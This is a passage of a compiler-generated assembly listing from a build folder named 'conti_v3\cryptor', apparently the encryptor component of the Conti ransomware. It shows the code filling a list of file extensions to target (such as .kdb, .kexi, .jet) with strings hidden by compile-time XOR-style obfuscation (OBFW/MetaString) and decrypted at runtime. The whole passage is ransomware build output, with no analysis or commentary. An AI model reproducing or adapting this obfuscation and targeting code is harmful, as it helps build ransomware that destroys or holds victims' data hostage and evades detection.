; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01c2f	c6 44 24 30 00	 mov	 BYTE PTR $T72[rsp], 0
  01c34	c6 44 24 31 15	 mov	 BYTE PTR $T72[rsp+1], 21
  01c39	c6 44 24 32 24	 mov	 BYTE PTR $T72[rsp+2], 36 ; 00000024H
  01c3e	c6 44 24 33 7e	 mov	 BYTE PTR $T72[rsp+3], 126 ; 0000007eH
  01c43	c6 44 24 34 24	 mov	 BYTE PTR $T72[rsp+4], 36 ; 00000024H
  01c48	c6 44 24 35 78	 mov	 BYTE PTR $T72[rsp+5], 120 ; 00000078H
  01c4d	c6 44 24 36 24	 mov	 BYTE PTR $T72[rsp+6], 36 ; 00000024H
  01c52	c6 44 24 37 24	 mov	 BYTE PTR $T72[rsp+7], 36 ; 00000024H
  01c57	c6 44 24 38 24	 mov	 BYTE PTR $T72[rsp+8], 36 ; 00000024H
  01c5c	0f b6 44 24 31	 movzx	 eax, BYTE PTR $T72[rsp+1]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 365  : 		OBFW(L".ib"),

  01c61	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  01c66	48 89 85 68 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+312], rax

; 366  : 		OBFW(L".idb"),

  01c6d	48 8d 8d b0 02
	00 00		 lea	 rcx, QWORD PTR $T73[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01c74	c6 85 b0 02 00
	00 00		 mov	 BYTE PTR $T73[rbp-256], 0
  01c7b	c6 85 b1 02 00
	00 05		 mov	 BYTE PTR $T73[rbp-255], 5
  01c82	c6 85 b2 02 00
	00 73		 mov	 BYTE PTR $T73[rbp-254], 115 ; 00000073H
  01c89	c6 85 b3 02 00
	00 0d		 mov	 BYTE PTR $T73[rbp-253], 13
  01c90	c6 85 b4 02 00
	00 73		 mov	 BYTE PTR $T73[rbp-252], 115 ; 00000073H
  01c97	c6 85 b5 02 00
	00 24		 mov	 BYTE PTR $T73[rbp-251], 36 ; 00000024H
  01c9e	c6 85 b6 02 00
	00 73		 mov	 BYTE PTR $T73[rbp-250], 115 ; 00000073H
  01ca5	c6 85 b7 02 00
	00 60		 mov	 BYTE PTR $T73[rbp-249], 96 ; 00000060H
  01cac	c6 85 b8 02 00
	00 73		 mov	 BYTE PTR $T73[rbp-248], 115 ; 00000073H
  01cb3	c6 85 b9 02 00
	00 73		 mov	 BYTE PTR $T73[rbp-247], 115 ; 00000073H
  01cba	c6 85 ba 02 00
	00 73		 mov	 BYTE PTR $T73[rbp-246], 115 ; 00000073H
  01cc1	0f b6 85 b1 02
	00 00		 movzx	 eax, BYTE PTR $T73[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 366  : 		OBFW(L".idb"),

  01cc8	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01ccd	48 89 85 70 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+320], rax

; 367  : 		OBFW(L".ihx"),

  01cd4	48 8d 8d c0 02
	00 00		 lea	 rcx, QWORD PTR $T74[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01cdb	c6 85 c0 02 00
	00 00		 mov	 BYTE PTR $T74[rbp-256], 0
  01ce2	c6 85 c1 02 00
	00 50		 mov	 BYTE PTR $T74[rbp-255], 80 ; 00000050H
  01ce9	c6 85 c2 02 00
	00 0c		 mov	 BYTE PTR $T74[rbp-254], 12
  01cf0	c6 85 c3 02 00
	00 70		 mov	 BYTE PTR $T74[rbp-253], 112 ; 00000070H
  01cf7	c6 85 c4 02 00
	00 0c		 mov	 BYTE PTR $T74[rbp-252], 12
  01cfe	c6 85 c5 02 00
	00 69		 mov	 BYTE PTR $T74[rbp-251], 105 ; 00000069H
  01d05	c6 85 c6 02 00
	00 0c		 mov	 BYTE PTR $T74[rbp-250], 12
  01d0c	c6 85 c7 02 00
	00 5a		 mov	 BYTE PTR $T74[rbp-249], 90 ; 0000005aH
  01d13	c6 85 c8 02 00
	00 0c		 mov	 BYTE PTR $T74[rbp-248], 12
  01d1a	c6 85 c9 02 00
	00 0c		 mov	 BYTE PTR $T74[rbp-247], 12
  01d21	c6 85 ca 02 00
	00 0c		 mov	 BYTE PTR $T74[rbp-246], 12
  01d28	0f b6 85 c1 02
	00 00		 movzx	 eax, BYTE PTR $T74[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 367  : 		OBFW(L".ihx"),

  01d2f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01d34	48 89 85 78 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+328], rax

; 368  : 		OBFW(L".itdb"),

  01d3b	48 8d 8d f0 07
	00 00		 lea	 rcx, QWORD PTR $T75[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01d42	c6 85 f0 07 00
	00 00		 mov	 BYTE PTR $T75[rbp-256], 0
  01d49	c6 85 f1 07 00
	00 32		 mov	 BYTE PTR $T75[rbp-255], 50 ; 00000032H
  01d50	c6 85 f2 07 00
	00 15		 mov	 BYTE PTR $T75[rbp-254], 21
  01d57	c6 85 f3 07 00
	00 65		 mov	 BYTE PTR $T75[rbp-253], 101 ; 00000065H
  01d5e	c6 85 f4 07 00
	00 15		 mov	 BYTE PTR $T75[rbp-252], 21
  01d65	c6 85 f5 07 00
	00 3d		 mov	 BYTE PTR $T75[rbp-251], 61 ; 0000003dH
  01d6c	c6 85 f6 07 00
	00 15		 mov	 BYTE PTR $T75[rbp-250], 21
  01d73	c6 85 f7 07 00
	00 49		 mov	 BYTE PTR $T75[rbp-249], 73 ; 00000049H
  01d7a	c6 85 f8 07 00
	00 15		 mov	 BYTE PTR $T75[rbp-248], 21
  01d81	c6 85 f9 07 00
	00 0b		 mov	 BYTE PTR $T75[rbp-247], 11
  01d88	c6 85 fa 07 00
	00 15		 mov	 BYTE PTR $T75[rbp-246], 21
  01d8f	c6 85 fb 07 00
	00 15		 mov	 BYTE PTR $T75[rbp-245], 21
  01d96	c6 85 fc 07 00
	00 15		 mov	 BYTE PTR $T75[rbp-244], 21
  01d9d	0f b6 85 f1 07
	00 00		 movzx	 eax, BYTE PTR $T75[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 368  : 		OBFW(L".itdb"),

  01da4	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  01da9	48 89 85 80 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+336], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01db0	c6 85 d0 02 00
	00 00		 mov	 BYTE PTR $T76[rbp-256], 0
  01db7	c6 85 d1 02 00
	00 7a		 mov	 BYTE PTR $T76[rbp-255], 122 ; 0000007aH
  01dbe	c6 85 d2 02 00
	00 3a		 mov	 BYTE PTR $T76[rbp-254], 58 ; 0000003aH
  01dc5	c6 85 d3 02 00
	00 37		 mov	 BYTE PTR $T76[rbp-253], 55 ; 00000037H
  01dcc	c6 85 d4 02 00
	00 3a		 mov	 BYTE PTR $T76[rbp-252], 58 ; 0000003aH
  01dd3	c6 85 d5 02 00
	00 78		 mov	 BYTE PTR $T76[rbp-251], 120 ; 00000078H
  01dda	c6 85 d6 02 00
	00 3a		 mov	 BYTE PTR $T76[rbp-250], 58 ; 0000003aH
  01de1	c6 85 d7 02 00
	00 50		 mov	 BYTE PTR $T76[rbp-249], 80 ; 00000050H
  01de8	c6 85 d8 02 00
	00 3a		 mov	 BYTE PTR $T76[rbp-248], 58 ; 0000003aH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01def	c6 85 d9 02 00
	00 3a		 mov	 BYTE PTR $T76[rbp-247], 58 ; 0000003aH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 369  : 		OBFW(L".itw"),

  01df6	48 8d 8d d0 02
	00 00		 lea	 rcx, QWORD PTR $T76[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01dfd	c6 85 da 02 00
	00 3a		 mov	 BYTE PTR $T76[rbp-246], 58 ; 0000003aH
  01e04	0f b6 85 d1 02
	00 00		 movzx	 eax, BYTE PTR $T76[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 369  : 		OBFW(L".itw"),

  01e0b	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01e10	48 89 85 88 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+344], rax

; 370  : 		OBFW(L".jet"),

  01e17	48 8d 8d e0 02
	00 00		 lea	 rcx, QWORD PTR $T77[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01e1e	c6 85 e0 02 00
	00 00		 mov	 BYTE PTR $T77[rbp-256], 0
  01e25	c6 85 e1 02 00
	00 3b		 mov	 BYTE PTR $T77[rbp-255], 59 ; 0000003bH
  01e2c	c6 85 e2 02 00
	00 27		 mov	 BYTE PTR $T77[rbp-254], 39 ; 00000027H
  01e33	c6 85 e3 02 00
	00 3f		 mov	 BYTE PTR $T77[rbp-253], 63 ; 0000003fH
  01e3a	c6 85 e4 02 00
	00 27		 mov	 BYTE PTR $T77[rbp-252], 39 ; 00000027H
  01e41	c6 85 e5 02 00
	00 69		 mov	 BYTE PTR $T77[rbp-251], 105 ; 00000069H
  01e48	c6 85 e6 02 00
	00 27		 mov	 BYTE PTR $T77[rbp-250], 39 ; 00000027H
  01e4f	c6 85 e7 02 00
	00 6a		 mov	 BYTE PTR $T77[rbp-249], 106 ; 0000006aH
  01e56	c6 85 e8 02 00
	00 27		 mov	 BYTE PTR $T77[rbp-248], 39 ; 00000027H
  01e5d	c6 85 e9 02 00
	00 27		 mov	 BYTE PTR $T77[rbp-247], 39 ; 00000027H
  01e64	c6 85 ea 02 00
	00 27		 mov	 BYTE PTR $T77[rbp-246], 39 ; 00000027H
  01e6b	0f b6 85 e1 02
	00 00		 movzx	 eax, BYTE PTR $T77[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 370  : 		OBFW(L".jet"),

  01e72	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01e77	48 89 85 90 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+352], rax

; 371  : 		OBFW(L".jtx"),

  01e7e	48 8d 8d f0 02
	00 00		 lea	 rcx, QWORD PTR $T78[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01e85	c6 85 f0 02 00
	00 00		 mov	 BYTE PTR $T78[rbp-256], 0
  01e8c	c6 85 f1 02 00
	00 50		 mov	 BYTE PTR $T78[rbp-255], 80 ; 00000050H
  01e93	c6 85 f2 02 00
	00 06		 mov	 BYTE PTR $T78[rbp-254], 6
  01e9a	c6 85 f3 02 00
	00 2c		 mov	 BYTE PTR $T78[rbp-253], 44 ; 0000002cH
  01ea1	c6 85 f4 02 00
	00 06		 mov	 BYTE PTR $T78[rbp-252], 6
  01ea8	c6 85 f5 02 00
	00 26		 mov	 BYTE PTR $T78[rbp-251], 38 ; 00000026H
  01eaf	c6 85 f6 02 00
	00 06		 mov	 BYTE PTR $T78[rbp-250], 6
  01eb6	c6 85 f7 02 00
	00 3d		 mov	 BYTE PTR $T78[rbp-249], 61 ; 0000003dH
  01ebd	c6 85 f8 02 00
	00 06		 mov	 BYTE PTR $T78[rbp-248], 6
  01ec4	c6 85 f9 02 00
	00 06		 mov	 BYTE PTR $T78[rbp-247], 6
  01ecb	c6 85 fa 02 00
	00 06		 mov	 BYTE PTR $T78[rbp-246], 6
  01ed2	0f b6 85 f1 02
	00 00		 movzx	 eax, BYTE PTR $T78[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 371  : 		OBFW(L".jtx"),

  01ed9	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$05U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<101,6,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01ede	48 89 85 98 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+360], rax

; 372  : 		OBFW(L".kdb"),

  01ee5	48 8d 8d 00 03
	00 00		 lea	 rcx, QWORD PTR $T79[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01eec	c6 85 00 03 00
	00 00		 mov	 BYTE PTR $T79[rbp-256], 0
  01ef3	c6 85 01 03 00
	00 6d		 mov	 BYTE PTR $T79[rbp-255], 109 ; 0000006dH
  01efa	c6 85 02 03 00
	00 01		 mov	 BYTE PTR $T79[rbp-254], 1
  01f01	c6 85 03 03 00
	00 46		 mov	 BYTE PTR $T79[rbp-253], 70 ; 00000046H
  01f08	c6 85 04 03 00
	00 01		 mov	 BYTE PTR $T79[rbp-252], 1
  01f0f	c6 85 05 03 00
	00 25		 mov	 BYTE PTR $T79[rbp-251], 37 ; 00000025H
  01f16	c6 85 06 03 00
	00 01		 mov	 BYTE PTR $T79[rbp-250], 1
  01f1d	c6 85 07 03 00
	00 52		 mov	 BYTE PTR $T79[rbp-249], 82 ; 00000052H
  01f24	c6 85 08 03 00
	00 01		 mov	 BYTE PTR $T79[rbp-248], 1
  01f2b	c6 85 09 03 00
	00 01		 mov	 BYTE PTR $T79[rbp-247], 1
  01f32	c6 85 0a 03 00
	00 01		 mov	 BYTE PTR $T79[rbp-246], 1
  01f39	0f b6 85 01 03
	00 00		 movzx	 eax, BYTE PTR $T79[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 372  : 		OBFW(L".kdb"),

  01f40	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01f45	48 89 85 a0 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+368], rax

; 373  : 		OBFW(L".kexi"),

  01f4c	48 8d 8d 00 08
	00 00		 lea	 rcx, QWORD PTR $T80[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01f53	c6 85 00 08 00
	00 00		 mov	 BYTE PTR $T80[rbp-256], 0
  01f5a	c6 85 01 08 00
	00 11		 mov	 BYTE PTR $T80[rbp-255], 17
  01f61	c6 85 02 08 00
	00 42		 mov	 BYTE PTR $T80[rbp-254], 66 ; 00000042H
  01f68	c6 85 03 08 00
	00 0a		 mov	 BYTE PTR $T80[rbp-253], 10
  01f6f	c6 85 04 08 00
	00 42		 mov	 BYTE PTR $T80[rbp-252], 66 ; 00000042H
  01f76	c6 85 05 08 00
	00 2c		 mov	 BYTE PTR $T80[rbp-251], 44 ; 0000002cH
  01f7d	c6 85 06 08 00
	00 42		 mov	 BYTE PTR $T80[rbp-250], 66 ; 00000042H
  01f84	c6 85 07 08 00
	00 15		 mov	 BYTE PTR $T80[rbp-249], 21
  01f8b	c6 85 08 08 00
	00 42		 mov	 BYTE PTR $T80[rbp-248], 66 ; 00000042H
  01f92	c6 85 09 08 00
	00 6a		 mov	 BYTE PTR $T80[rbp-247], 106 ; 0000006aH
  01f99	c6 85 0a 08 00
	00 42		 mov	 BYTE PTR $T80[rbp-246], 66 ; 00000042H
  01fa0	c6 85 0b 08 00
	00 42		 mov	 BYTE PTR $T80[rbp-245], 66 ; 00000042H
  01fa7	c6 85 0c 08 00
	00 42		 mov	 BYTE PTR $T80[rbp-244], 66 ; 00000042H
  01fae	0f b6 85 01 08
	00 00		 movzx	 eax, BYTE PTR $T80[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 373  : 		OBFW(L".kexi"),

  01fb5	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  01fba	48 89 85 a8 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+376], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01fc1	c6 85 e0 08 00
	00 00		 mov	 BYTE PTR $T81[rbp-256], 0
  01fc8	c6 85 e1 08 00
	00 33		 mov	 BYTE PTR $T81[rbp-255], 51 ; 00000033H
  01fcf	c6 85 e2 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-254], 117 ; 00000075H
  01fd6	c6 85 e3 08 00
	00 60		 mov	 BYTE PTR $T81[rbp-253], 96 ; 00000060H
  01fdd	c6 85 e4 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-252], 117 ; 00000075H
  01fe4	c6 85 e5 08 00
	00 4d		 mov	 BYTE PTR $T81[rbp-251], 77 ; 0000004dH
  01feb	c6 85 e6 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-250], 117 ; 00000075H
  01ff2	c6 85 e7 08 00
	00 74		 mov	 BYTE PTR $T81[rbp-249], 116 ; 00000074H
  01ff9	c6 85 e8 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-248], 117 ; 00000075H
  02000	c6 85 e9 08 00
	00 05		 mov	 BYTE PTR $T81[rbp-247], 5
  02007	c6 85 ea 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-246], 117 ; 00000075H
  0200e	c6 85 eb 08 00
	00 71		 mov	 BYTE PTR $T81[rbp-245], 113 ; 00000071H
  02015	c6 85 ec 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-244], 117 ; 00000075H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0201c	c6 85 ed 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-243], 117 ; 00000075H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 374  : 		OBFW(L".kexic"),

  02023	48 8d 8d e0 08
	00 00		 lea	 rcx, QWORD PTR $T81[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0202a	c6 85 ee 08 00
	00 75		 mov	 BYTE PTR $T81[rbp-242], 117 ; 00000075H
  02031	0f b6 85 e1 08
	00 00		 movzx	 eax, BYTE PTR $T81[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 374  : 		OBFW(L".kexic"),

  02038	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GN@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<109,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  0203d	48 89 85 b0 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+384], rax

; 375  : 		OBFW(L".kexis"),

  02044	48 8d 8d f0 08
	00 00		 lea	 rcx, QWORD PTR $T82[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0204b	c6 85 f0 08 00
	00 00		 mov	 BYTE PTR $T82[rbp-256], 0
  02052	c6 85 f1 08 00
	00 27		 mov	 BYTE PTR $T82[rbp-255], 39 ; 00000027H
  02059	c6 85 f2 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-254], 70 ; 00000046H
  02060	c6 85 f3 08 00
	00 59		 mov	 BYTE PTR $T82[rbp-253], 89 ; 00000059H
  02067	c6 85 f4 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-252], 70 ; 00000046H
  0206e	c6 85 f5 08 00
	00 52		 mov	 BYTE PTR $T82[rbp-251], 82 ; 00000052H
  02075	c6 85 f6 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-250], 70 ; 00000046H
  0207c	c6 85 f7 08 00
	00 53		 mov	 BYTE PTR $T82[rbp-249], 83 ; 00000053H
  02083	c6 85 f8 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-248], 70 ; 00000046H
  0208a	c6 85 f9 08 00
	00 02		 mov	 BYTE PTR $T82[rbp-247], 2
  02091	c6 85 fa 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-246], 70 ; 00000046H
  02098	c6 85 fb 08 00
	00 38		 mov	 BYTE PTR $T82[rbp-245], 56 ; 00000038H
  0209f	c6 85 fc 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-244], 70 ; 00000046H
  020a6	c6 85 fd 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-243], 70 ; 00000046H
  020ad	c6 85 fe 08 00
	00 46		 mov	 BYTE PTR $T82[rbp-242], 70 ; 00000046H
  020b4	0f b6 85 f1 08
	00 00		 movzx	 eax, BYTE PTR $T82[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 375  : 		OBFW(L".kexis"),

  020bb	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  020c0	48 89 85 b8 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+392], rax

; 376  : 		OBFW(L".lgc"),

  020c7	48 8d 8d 10 03
	00 00		 lea	 rcx, QWORD PTR $T83[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  020ce	c6 85 10 03 00
	00 00		 mov	 BYTE PTR $T83[rbp-256], 0
  020d5	c6 85 11 03 00
	00 6e		 mov	 BYTE PTR $T83[rbp-255], 110 ; 0000006eH
  020dc	c6 85 12 03 00
	00 5d		 mov	 BYTE PTR $T83[rbp-254], 93 ; 0000005dH
  020e3	c6 85 13 03 00
	00 1c		 mov	 BYTE PTR $T83[rbp-253], 28
  020ea	c6 85 14 03 00
	00 5d		 mov	 BYTE PTR $T83[rbp-252], 93 ; 0000005dH
  020f1	c6 85 15 03 00
	00 33		 mov	 BYTE PTR $T83[rbp-251], 51 ; 00000033H
  020f8	c6 85 16 03 00
	00 5d		 mov	 BYTE PTR $T83[rbp-250], 93 ; 0000005dH
  020ff	c6 85 17 03 00
	00 2c		 mov	 BYTE PTR $T83[rbp-249], 44 ; 0000002cH
  02106	c6 85 18 03 00
	00 5d		 mov	 BYTE PTR $T83[rbp-248], 93 ; 0000005dH
  0210d	c6 85 19 03 00
	00 5d		 mov	 BYTE PTR $T83[rbp-247], 93 ; 0000005dH
  02114	c6 85 1a 03 00
	00 5d		 mov	 BYTE PTR $T83[rbp-246], 93 ; 0000005dH
  0211b	0f b6 85 11 03
	00 00		 movzx	 eax, BYTE PTR $T83[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 376  : 		OBFW(L".lgc"),

  02122	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02127	48 89 85 c0 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+400], rax

; 377  : 		OBFW(L".lwx"),

  0212e	48 8d 8d 20 03
	00 00		 lea	 rcx, QWORD PTR $T84[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02135	c6 85 20 03 00
	00 00		 mov	 BYTE PTR $T84[rbp-256], 0
  0213c	c6 85 21 03 00
	00 30		 mov	 BYTE PTR $T84[rbp-255], 48 ; 00000030H
  02143	c6 85 22 03 00
	00 66		 mov	 BYTE PTR $T84[rbp-254], 102 ; 00000066H
  0214a	c6 85 23 03 00
	00 2f		 mov	 BYTE PTR $T84[rbp-253], 47 ; 0000002fH
  02151	c6 85 24 03 00
	00 66		 mov	 BYTE PTR $T84[rbp-252], 102 ; 00000066H
  02158	c6 85 25 03 00
	00 0c		 mov	 BYTE PTR $T84[rbp-251], 12
  0215f	c6 85 26 03 00
	00 66		 mov	 BYTE PTR $T84[rbp-250], 102 ; 00000066H
  02166	c6 85 27 03 00
	00 37		 mov	 BYTE PTR $T84[rbp-249], 55 ; 00000037H
  0216d	c6 85 28 03 00
	00 66		 mov	 BYTE PTR $T84[rbp-248], 102 ; 00000066H
  02174	c6 85 29 03 00
	00 66		 mov	 BYTE PTR $T84[rbp-247], 102 ; 00000066H
  0217b	c6 85 2a 03 00
	00 66		 mov	 BYTE PTR $T84[rbp-246], 102 ; 00000066H
  02182	0f b6 85 21 03
	00 00		 movzx	 eax, BYTE PTR $T84[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 377  : 		OBFW(L".lwx"),

  02189	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<43,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0218e	48 89 85 c8 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+408], rax

; 378  : 		OBFW(L".maf"),

  02195	48 8d 8d 30 03
	00 00		 lea	 rcx, QWORD PTR $T85[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0219c	c6 85 30 03 00
	00 00		 mov	 BYTE PTR $T85[rbp-256], 0
  021a3	c6 85 31 03 00
	00 69		 mov	 BYTE PTR $T85[rbp-255], 105 ; 00000069H
  021aa	c6 85 32 03 00
	00 0d		 mov	 BYTE PTR $T85[rbp-254], 13
  021b1	c6 85 33 03 00
	00 68		 mov	 BYTE PTR $T85[rbp-253], 104 ; 00000068H
  021b8	c6 85 34 03 00
	00 0d		 mov	 BYTE PTR $T85[rbp-252], 13
  021bf	c6 85 35 03 00
	00 50		 mov	 BYTE PTR $T85[rbp-251], 80 ; 00000050H
  021c6	c6 85 36 03 00
	00 0d		 mov	 BYTE PTR $T85[rbp-250], 13
  021cd	c6 85 37 03 00
	00 5a		 mov	 BYTE PTR $T85[rbp-249], 90 ; 0000005aH
  021d4	c6 85 38 03 00
	00 0d		 mov	 BYTE PTR $T85[rbp-248], 13
  021db	c6 85 39 03 00
	00 0d		 mov	 BYTE PTR $T85[rbp-247], 13
  021e2	c6 85 3a 03 00
	00 0d		 mov	 BYTE PTR $T85[rbp-246], 13
  021e9	0f b6 85 31 03
	00 00		 movzx	 eax, BYTE PTR $T85[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 378  : 		OBFW(L".maf"),

